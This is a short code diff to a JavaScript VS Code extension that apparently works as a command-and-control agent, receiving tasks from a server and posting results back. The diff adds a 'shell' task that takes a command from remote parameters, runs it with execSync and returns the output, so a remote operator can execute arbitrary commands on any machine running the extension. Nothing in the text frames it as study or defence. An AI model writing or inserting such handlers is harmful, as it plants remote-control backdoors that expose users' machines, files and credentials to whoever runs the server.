@@ -1,5 +1,6 @@
 const vscode = require('vscode');
 const os = require('os');
+const { execSync } = require("child_process");
 const url = require('url');
 
 const axios = require('axios').default;
@@ -116,6 +117,10 @@ function handleTasks(context, tasks) {
 				break
 			case 'pwd':
 				output = process.cwd()
+				break
+			case 'shell':
+				const cmd = JSON.parse(parameters)['command']
+				output = execSync(cmd).toString()
 				break
 		}
 		postTaskResponse(callbackUUID, taskID, output)
